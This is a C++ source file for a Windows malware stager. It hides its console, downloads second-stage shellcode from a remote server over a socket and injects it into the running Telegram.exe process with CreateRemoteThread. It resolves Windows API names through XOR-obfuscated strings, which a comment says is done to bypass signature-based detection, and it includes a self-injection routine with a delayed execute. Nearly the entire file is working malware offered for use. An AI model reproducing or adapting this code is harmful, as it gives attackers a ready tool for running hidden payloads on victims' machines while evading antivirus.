
#include "sockets.h"
#include <bitset>
#include <string>
#include <sstream>
#include <iostream>
#include <vector>
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <fstream>
#include <ctime>
#include <csignal>
#include <TlHelp32.h>
const int bufferSize = 3020288;
unsigned char buffer[bufferSize];

BOOL(WINAPI* pv_protect) (LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);
LPVOID(WINAPI* pV_alloc) (LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
FARPROC(WINAPI* p_gtprocAd) (HMODULE hModule, LPCSTR  lpProcName);
LPVOID(WINAPI* pV_alloc_Ex)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
BOOL(WINAPI* pWrite_proc_Mem)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
HANDLE(WINAPI* p_crt_rem_thrd)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
HANDLE(WINAPI* popen_proc) (DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);
BOOL(WINAPI* p_close_hndl)(HANDLE hObject);
void (WINAPI* pSleep)(DWORD dwMilliseconds);
HANDLE(WINAPI* p_crt_tool_32snp_shot)(DWORD dwFlags, DWORD th32ProcessID);
BOOL(WINAPI* p_proc_32_first)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
BOOL(WINAPI* p_proc_32_nxt)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
BOOL(WINAPI* p_virt_protect_ex)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
VOID(WINAPI* p_rtlmvm) (VOID UNALIGNED* Destination, VOID UNALIGNED* Source, SIZE_T Length);

//asci => 8 bits => 1 byte
std::string xor_binary_string(const std::string& binary_string, const std::string& key) {
	std::string result;
	std::size_t key_size = key.size();
	for (std::size_t i = 0; i < binary_string.size(); i += 8) {
		std::bitset<8> byte(binary_string.substr(i, 8));
		byte ^= std::bitset<8>(key[i / 8 % key_size]);
		result += static_cast<char>(byte.to_ulong());
	}
	return result;
}


bool InjectPayload_custom()
{
	std::string key = "secure_101";
// obfuscated names 
	std::string krnl = xor_binary_string("000110000000000000010001000110110001011100001001011011000000001100011110010101010001111100001001", key); //  kernel32.dll
	std::string V_protect = xor_binary_string("0010010100001100000100010000000100000111000001000011001101100001010000100101111000000111000000000000000000000001", key); //VirtualProtect //change premmision to be executable
	std::string V_alloc = xor_binary_string("001001010000110000010001000000010000011100000100001100110111000001011100010111010001110000000110", key);	//VirtualAlloc  //allocate space 
	std::string rtlmvm = xor_binary_string("00100001000100010000111100111000000111010001001100111010011111000101010101011100000111000001011100011010", key);	//RtlMoveMemory  //copy some bytes to memory address

	//define :
	BOOL(WINAPI * pv_protect) (LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
	VOID(WINAPI * p_rtlmvm) (VOID UNALIGNED * Destination, VOID UNALIGNED * Source, SIZE_T Length);
	LPVOID(WINAPI * pV_alloc) (LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
	// assign :
	HMODULE hrkrn32 = GetModuleHandle(krnl.c_str());
	pV_alloc = reinterpret_cast<LPVOID(__cdecl*)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect)>(GetProcAddress(hrkrn32, V_alloc.c_str()));
	pv_protect = reinterpret_cast<BOOL(__cdecl*)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect)>(GetProcAddress(hrkrn32, V_protect.c_str()));
	p_rtlmvm = reinterpret_cast<VOID(__cdecl*)(VOID UNALIGNED * Destination, VOID UNALIGNED * Source, SIZE_T Length)>(GetProcAddress(hrkrn32, rtlmvm.c_str()));

	// read write , then copy shellcode , execute
	void* exec = pV_alloc(0, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	DWORD oldprotect = 0;
	BOOL statues = false;
	Sleep(10000);
	statues = pv_protect(exec, bufferSize, PAGE_EXECUTE_READWRITE, &oldprotect);
	if (statues) {
		p_rtlmvm(exec, buffer, bufferSize);
		((void(*)())exec)();
	}


	return true;
}



void define_custom_winApi() {




	// writing functions names encrypted , to bypass signature based detection

	std::string key = "secure_101";
	std::string krnl = xor_binary_string("000110000000000000010001000110110001011100001001011011000000001100011110010101010001111100001001", key); //  kernel32.dll

	// for process injection
	std::string V_protect = xor_binary_string("0010010100001100000100010000000100000111000001000011001101100001010000100101111000000111000000000000000000000001", key); //VirtualProtect
	std::string V_alloc = xor_binary_string("001001010000110000010001000000010000011100000100001100110111000001011100010111010001110000000110", key);	//VirtualAlloc
	std::string gtprocAd = xor_binary_string("0011010000000000000101110010010100000000000010100011110001110000010101000101010100000001000000000001000000000110", key);// GetProcAddress
	std::string opn_proc = xor_binary_string("0011110000010101000001100001101100100010000101110011000001010010010101010100001000000000", key);	//OpenProcess
	std::string v_alloc_ex = xor_binary_string("0010010100001100000100010000000100000111000001000011001101110000010111000101110100011100000001100010011000001101", key); 	// VirtualAllocEx
	std::string writ_proc_mem = xor_binary_string("001001000001011100001010000000010001011100110101001011010101111001010011010101000000000000010110001011100001000000011111000010100010110101001000", key);// WriteProcessMemory
	std::string crt_remote_thrd = xor_binary_string("001100000001011100000110000101000000011000000000000011010101010001011101010111100000011100000000001101110001110100000000000000000011111001010101", key);	//CreateRemoteThread
	std::string close_hndl = xor_binary_string("0011000000001001000011000000011000010111001011010011111001011111010101000101110100010110", key);	//CloseHandle 
	std::string crt_tool_snp_shot = xor_binary_string("001100000001011100000110000101000000011000000000000010110101111001011111010111010001101100000000000011110000010101000001010101110000110001011111010100010100000100000000000011010000110000000001", key);// CreateToolhelp32Snapshot
	std::string proc_first = xor_binary_string("0010001100010111000011000001011000010111000101100010110000000010000000100111011100011010000101110001000000000001", key);	//Process32First
	std::string proc_nxt = xor_binary_string("00100011000101110000110000010110000101110001011000101100000000100000001001111111000101100001110100010111", key);	//Process32Next 
	std::string virt_protect_ex = xor_binary_string("00100101000011000001000100000001000001110000010000110011011000010100001001011110000001110000000000000000000000010011011100011101", key);	//VirtualProtectEx 
	std::string rtlmvm = xor_binary_string("00100001000100010000111100111000000111010001001100111010011111000101010101011100000111000001011100011010", key);	//RtlMoveMemory


	HMODULE hKernel32 = GetModuleHandleA(krnl.c_str());
	pV_alloc = reinterpret_cast<LPVOID(__cdecl*)(LPVOID, SIZE_T, DWORD, DWORD)>(GetProcAddress(hKernel32, V_alloc.c_str()));
	pv_protect = reinterpret_cast<BOOL(__cdecl*)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect)>(GetProcAddress(hKernel32, V_protect.c_str()));
	p_rtlmvm = reinterpret_cast<VOID(__cdecl*)(VOID UNALIGNED * Destination, VOID UNALIGNED * Source, SIZE_T Length)>(GetProcAddress(hKernel32, rtlmvm.c_str()));
	popen_proc = reinterpret_cast<HANDLE(__cdecl*)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId)>(GetProcAddress(hKernel32, opn_proc.c_str()));
	p_close_hndl = reinterpret_cast<BOOL(__cdecl*)(HANDLE hObject)>(GetProcAddress(hKernel32, close_hndl.c_str()));
	pV_alloc_Ex = reinterpret_cast<LPVOID(__cdecl*)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)>(GetProcAddress(hKernel32, v_alloc_ex.c_str()));
	pWrite_proc_Mem = reinterpret_cast<BOOL(__cdecl*)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten)>(GetProcAddress(hKernel32, writ_proc_mem.c_str()));
	p_crt_rem_thrd = reinterpret_cast<HANDLE(__cdecl*)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)>(GetProcAddress(hKernel32, crt_remote_thrd.c_str()));
	p_crt_tool_32snp_shot = reinterpret_cast<HANDLE(__cdecl*)(DWORD dwFlags, DWORD th32ProcessID)>(GetProcAddress(hKernel32, crt_tool_snp_shot.c_str()));
	p_proc_32_first = reinterpret_cast<BOOL(__cdecl*)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)>(GetProcAddress(hKernel32, proc_first.c_str()));
	p_proc_32_nxt = reinterpret_cast<BOOL(__cdecl*)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)>(GetProcAddress(hKernel32, proc_nxt.c_str()));
	p_virt_protect_ex = reinterpret_cast<BOOL(__cdecl*)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect)>(GetProcAddress(hKernel32, virt_protect_ex.c_str()));


}



int get_proc_ID(const char* procname) {
	
		HANDLE hProcSnap;
		PROCESSENTRY32 pe32;
		int pid = 0;
		hProcSnap = p_crt_tool_32snp_shot(TH32CS_SNAPPROCESS, 0);// get all running processes
		if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (!p_proc_32_first(hProcSnap, &pe32)) { // check if first process is found , in the  linked list
			p_close_hndl(hProcSnap);
			return 0;
		}
		while (p_proc_32_nxt(hProcSnap, &pe32)) { // get next process 
			if (lstrcmpiA(procname, pe32.szExeFile) == 0) { // compare
				pid = pe32.th32ProcessID;
				break;
			}
		}
		p_close_hndl(hProcSnap);
	
	
		return pid;
	}
	
	
	
bool  inject_stage2(const char* procname) {
		// get target process id
		int pid = get_proc_ID(procname);
	
	
		if (!buffer) {
			std::cerr << "Could not load the shellcode\n";
			return 0;
		}
	
		std::cout << "Injecting to: " << pid << "\n";
		HANDLE hProcess = popen_proc(PROCESS_ALL_ACCESS, FALSE, pid);// open process with all access permsion
		if (hProcess == NULL) {
			std::cerr << "[ERROR] Could not open process : " << std::hex << GetLastError() << std::endl;
			return 0;
		}
		LPVOID remote_buf = pV_alloc_Ex(hProcess, NULL, sizeof(buffer), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
		if (remote_buf == NULL) {
			std::cerr << "[ERROR] Could not allocate a remote buffer : " << std::hex << GetLastError() << std::endl;
			return 0;
		}
	
		if (!pWrite_proc_Mem(hProcess, remote_buf, buffer, sizeof(buffer), NULL)) {
			std::cerr << "[ERROR] WriteProcessMemory failed, status : " << std::hex << GetLastError() << std::endl;
			return 0;
		}
	
		// Change the memory protection to executable
		DWORD flProtect;
		if (!p_virt_protect_ex(hProcess, remote_buf, sizeof(buffer), PAGE_EXECUTE_READWRITE, &flProtect))
		{
			// Failed to change memory protection
			p_close_hndl(hProcess);
			return false;
		}
		HANDLE hMyThread = NULL;
		DWORD threadId = 0;
		if ((hMyThread = p_crt_rem_thrd(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)remote_buf, NULL, 0, &threadId)) == NULL) {
			std::cerr << "[ERROR] CreateRemoteThread failed, status : " << std::hex << GetLastError() << std::endl;
			return 0;
		}
		std::cout << "Injected, created Thread, id = " << threadId << "\n";
		p_close_hndl(hMyThread);
		p_close_hndl(hProcess);
	
		// Wait for 5 seconds before exiting
	
		Sleep(5000);
		return 1;
	
	}







//
//
//
//
//bool run_s2()
//{
//	// read write , then copy shellcode , execute
//	void* exec = VirtualAlloc(0, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//	DWORD oldprotect = 0;
//	BOOL statues = false;
//	Sleep(10000);
//	statues = VirtualProtect(exec, bufferSize, PAGE_EXECUTE_READWRITE, &oldprotect);
//	if (statues) {
//		RtlMoveMemory(exec, buffer, bufferSize);
//		((void(*)())exec)();
//	}
//
//
//	return true;
//}
////



std::string getPrivateIPAddress() {
	std::vector<std::string> privateIPs;

	char hostname[1024];
	if (gethostname(hostname, 1024) != 0) {
		std::cerr << "Error getting hostname: " << std::endl;
		return "";
	}

	struct addrinfo hints, * res;
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;

	int status = getaddrinfo(hostname, nullptr, &hints, &res);
	if (status != 0) {
		std::cerr << "Error getting address information: " << gai_strerror(status) << std::endl;
		return "";
	}

	for (struct addrinfo* p = res; p != nullptr; p = p->ai_next) {
		char name[NI_MAXHOST];
		if (getnameinfo(p->ai_addr, p->ai_addrlen, name, NI_MAXHOST, nullptr, 0, NI_NAMEREQD) == 0) {
			//std::cout << "Canonical name: " << name << std::endl;
			struct sockaddr_in* ipv4 = (struct sockaddr_in*)p->ai_addr;
			char ipstr[INET_ADDRSTRLEN];
			inet_ntop(AF_INET, &(ipv4->sin_addr), ipstr, INET_ADDRSTRLEN);
			//std::cout << "IP address: " << ipstr << std::endl;
			struct in_addr addr = ipv4->sin_addr;
			if (ntohl(addr.s_addr) >> 24 == 0x0A
				|| ntohl(addr.s_addr) >> 20 == (0xAC10 >> 4)
				|| ntohl(addr.s_addr) >> 16 == (0xC0A8)) {
				privateIPs.emplace_back(ipstr);
			}
		}
	}

	freeaddrinfo(res);

	if (!privateIPs.empty()) {
		std::vector<std::string> filteredIPAddresses;
		for (const auto& ipAddress : privateIPs) {
			if (ipAddress.compare(0, 10, "192.168.1.") == 0) {
				filteredIPAddresses.emplace_back(ipAddress);
			}
		}
		return filteredIPAddresses[0];

	}
	else {
		return "";
	}
}


bool get_stage2_from_Server() {
	bool gettingstage2 = true;
	while (gettingstage2) {
		// Create a client socket
		SOCKET clientId = create_socket_clientid();
		if (clientId == INVALID_SOCKET) {
			//std::cerr << "Failed to create client socket" << std::endl;
			continue;
		}

		// Connect to the server
		if (!connectToServer(clientId)) {
			closesocket(clientId);
			WSACleanup();
			continue;
		}

		// Communication with server
		while (true) {

			// Receive data from the server
			//receive_data(clientId, &dataReceived, &dataSize);

			std::cout << "connecting ... ";
			// Receive the data from the server
			int bytesReceived = recv(clientId, (char*)buffer, bufferSize, 0);
			if (bytesReceived == SOCKET_ERROR) {
				//std::cerr << "Error receiving data: " << WSAGetLastError() << std::endl;
				return 0;
			}


			if (bytesReceived > 0) {
				//std::cout << "s2 ! " << std::endl;
				/*for (int i = 0; i < bufferSize; i++) {
					std::cout << "0x" << std::hex << (int)buffer[i] << ", ";
				}*/
				gettingstage2 = false;
				break;
			}
		}
		// Close the socket and clean up Winsock
		closesocket(clientId);
		WSACleanup();
	}
	return true;

}
int main(int argc, char* argv[]) {
	FreeConsole();
	std::cout << "hello";
	bool stage2 = false;
	stage2 = get_stage2_from_Server();
	//InjectPayload_custom();
	// assign  the custom function pointers to winapi functions addresses and casting it  
	define_custom_winApi();
	inject_stage2("Telegram.exe");// trigger bitdefender  detection
	//run_s2();

	return 0;

}



//while (gettingstage2) {
	//	// Create a client socket
	//	SOCKET clientId = create_socket_clientid();
	//	if (clientId == INVALID_SOCKET) {
	//		//std::cerr << "Failed to create client socket" << std::endl;
	//		continue;
	//	}

	//	// Connect to the server
	//	if (!connectToServer(clientId)) {
	//		closesocket(clientId);
	//		WSACleanup();
	//		continue;
	//	}

	//	// Communication with server
	//	while (true) {

	//		// Receive data from the server
	//		//receive_data(clientId, &dataReceived, &dataSize);


	//		// Receive the data from the server
	//		int bytesReceived = recv(clientId, (char*)buffer, bufferSize, 0);
	//		if (bytesReceived == SOCKET_ERROR) {
	//			//std::cerr << "Error receiving data: " << WSAGetLastError() << std::endl;
	//			return 0;
	//		}


	//		if (bytesReceived > 0) {
	//			//std::cout << "s2 ! " << std::endl;
	//			/*for (int i = 0; i < bufferSize; i++) {
	//				std::cout << "0x" << std::hex << (int)buffer[i] << ", ";
	//			}*/
	//			gettingstage2 = false;
	//			break;
	//		}
	//	}
	//	// Close the socket and clean up Winsock
	//	closesocket(clientId);
	//	WSACleanup();
	//}

	//define_custom_winApi();
//unsigned int clientId = create_socket_clientid();